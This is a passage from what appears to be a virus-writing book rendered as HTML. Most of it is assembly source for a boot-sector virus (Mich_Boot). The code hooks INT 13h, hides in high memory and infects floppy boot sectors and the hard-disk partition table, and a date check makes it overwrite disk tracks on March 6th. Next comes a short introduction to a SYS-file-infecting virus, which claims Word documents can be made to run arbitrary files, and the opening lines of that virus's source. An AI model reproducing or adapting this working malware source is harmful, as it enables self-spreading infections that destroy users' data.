&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,301h &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Prepare to write the real<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; dh,1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; boot sector to side 1<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; cl,3&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; sector 3<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; byte ptr [bx+15h],0FDh&nbsp; ;Is this a floppy?<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; je&nbsp; &nbsp; &nbsp; Write_Real_Boot &nbsp; &nbsp; &nbsp; &nbsp; ;Write as is if so<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; cl,0Eh&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Otherwise, use sector 14<br />
<br />
Write_Real_Boot:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; word ptr Track_Sector,cx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pushf<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call&nbsp; &nbsp; dword ptr INT13_Ofs<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jb&nbsp; &nbsp; &nbsp; Quit<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; si,3BEh<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; di,1BEh<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; cx,21h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cld &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Copy info from end of sector<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; repz&nbsp; &nbsp; movsw &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; (Partition table if HD)<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,301h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp; bx,bx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; cx,1<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp; dx,dx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pushf<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call&nbsp; &nbsp; dword ptr INT13_Ofs<br />
<br />
Quit:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; di<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; si<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; es<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; ds<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; dx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; cx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; bx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; retn&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Infection finished<br />
<br />
;=== Virus installation code ==============================<br />
<br />
Second_Entry:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp; ax,ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ds,ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cli<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ss,ax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;ss=ds=ax=0<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,7C00h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; sp,ax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;stack pointer at boot buffer<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sti<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; ds ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,word ptr ds:(13h * 4);Store INT 13h vector<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; word ptr ds:INT13_Ofs + 7C00h,ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,word ptr ds:(13h * 4) + 2<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; word ptr ds:INT13_Seg + 7C00h,ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,word ptr ds:413h &nbsp; &nbsp; ;Get system memory count<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dec &nbsp; &nbsp; ax&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Subtract 2K from it<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dec &nbsp; &nbsp; ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; word ptr ds:413h,ax &nbsp; &nbsp; ;Store new memory total<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; cl,6&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Convert it to segment address<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; shl &nbsp; &nbsp; ax,cl<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; es,ax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Store location ES<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; word ptr ds:Hi_JMP_Seg + 7C00h,ax ;Also needed<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;for far jmp<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lea &nbsp; &nbsp; ax,INT_13h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Trap INT 13h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; word ptr ds:(13h * 4),ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; word ptr ds:(13h * 4) + 2,es<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; cx,1BEh &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Max length of virus<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; si,7C00h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Start of virus in memory<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp; di,di &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Start of new segment<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cld<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; repz&nbsp; &nbsp; movsb &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Copy virus code to new seg<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jmp &nbsp; &nbsp; dword ptr cs:Hi_JMP + 7C00h &nbsp; &nbsp; ;JMP_Here in new seg<br />
<br />
;=== Following code executed in top of memory only ========<br />
JMP_Here:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp; ax,ax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Reset Disk<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; es,ax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Clear ES<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 13h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; cs<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; ds&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;ds=cs<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,201h &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;read a sector<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; bx,7C00h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; to boot buffer<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; cx,word ptr Track_Sector<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; cx,7&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Are we pointing to sector 7?<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jne &nbsp; &nbsp; Read_Diskette<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; dx,80h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Then prep to boot from HD<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 13h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jmp &nbsp; &nbsp; short Check_Date&nbsp; &nbsp; &nbsp; &nbsp; ;BUT, check date first!<br />
<br />
Read_Diskette:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; cx,word ptr Track_Sector;Read in real BS<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; dx,100h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 13h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jb&nbsp; &nbsp; &nbsp; Check_Date<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; cs<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; es<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,201h &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Read in Partn table from<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; bx,200h &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; hard drive<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; cx,1<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; dx,80h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 13h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jb&nbsp; &nbsp; &nbsp; Check_Date<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp; si,si<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cld<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lodsw &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Look at first 2 bytes<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; ax,word ptr [bx]&nbsp; &nbsp; &nbsp; &nbsp; ;Doe they look like ours?<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jne &nbsp; &nbsp; Infect_Partition<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lodsw &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Look at the next 2 bytes<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; ax,word ptr [bx + 2]&nbsp; &nbsp; ;Do they look like ours?<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jne &nbsp; &nbsp; Infect_Partition&nbsp; &nbsp; &nbsp; &nbsp; ;If not, infect it<br />
<br />
Check_Date:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp; cx,cx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ah,4&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Check date<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 1Ah<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; dx,306h &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;March 6th?<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; je&nbsp; &nbsp; &nbsp; Detonate&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;if so, destroy<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; retf&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Otherwise, ret<br />
<br />
;=== March 6th detonation code ============================<br />
Detonate:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp; dx,dx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; cx,1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Track 0, sector 1<br />
<br />
Sec_Locs:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,309h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; si,word ptr Track_Sector<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; si,3<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; je&nbsp; &nbsp; &nbsp; Write_On_Them<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; al,0Eh<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; si,0Eh<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; je&nbsp; &nbsp; &nbsp; Write_On_Them<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; dl,80h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; byte ptr Disk_Number,4<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; al,11h<br />
<br />
Write_On_Them:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; bx,5000h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; es,bx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 13h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jnb &nbsp; &nbsp; Cont_Writing<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp; ah,ah &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Reset Disk<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 13h<br />
<br />
Cont_Writing:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; inc &nbsp; &nbsp; dh<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; dh,byte ptr Disk_Number<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jb&nbsp; &nbsp; &nbsp; Sec_Locs<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp; dh,dh<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; inc &nbsp; &nbsp; ch<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jmp &nbsp; &nbsp; short Sec_Locs<br />
<br />
;=== Partition infection code =============================<br />
<br />
Infect_Partition:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; cx,7<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; word ptr Track_Sector,cx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,301h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; dx,80h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Write original partition code<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 13h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jb&nbsp; &nbsp; &nbsp; Check_Date<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; si,3BEh<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; di,1BEh<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; cx,21h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Copy partition info<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; repz&nbsp; &nbsp; movsw<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,301h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp; bx,bx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; inc &nbsp; &nbsp; cl&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Write virus to HD<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 13h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jmp &nbsp; &nbsp; short Check_Date<br />
<br />
;=== Partition Table space ================================<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; 1BEh<br />
<br />
Partitions&nbsp; &nbsp; &nbsp; equ &nbsp; &nbsp; $ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;Partition tables start here, ------------<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; so virus must be less than ------------<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; 1BEh bytes long ------------------------<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; 1FEh<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dw&nbsp; &nbsp; &nbsp; 0AA55h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;End of Boot Sector marker<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; end &nbsp; &nbsp; Mich_Boot<br />
</span></div>
<!--p.195-->
<h3><a name="pj4"></a>SYS Inf</h3>
<p>If a file is executable in any way, a virus can infect it. For that matter, macro languages used in word processors, spreadsheets, modem dialing software, configuration languages, and so on, could all be vulnerable to viral attention if someone were willing to dedicate the time to figuring it out. The author has already found ways to cause Microsoft Word documents to open, modify and execute arbitrary files. This, and the next virus demonstrate that this is the case.</p>
<p>The SYS Inf virus is a very basic virus which infects SYS files. It properly conforms to the device driver format, and operates by exploiting a device driver's ability to be chained together. This is a complicated infection which requires some interesting automatic reverse-engineering in order to install the viral device driver.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>model&nbsp; tiny<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; SYS files originate at zero</span><br />
<br />
header<span style="color: #339933;">:</span><br />
next_header &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; <span style="color: #339933;">-</span><span style="color: #ff0000;">1</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; FFFF:FFFF</span><br />
attribute &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">8000h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; character device</span><br />
strategy&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset _strategy<br />
interrupt &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset _interrupt<br />
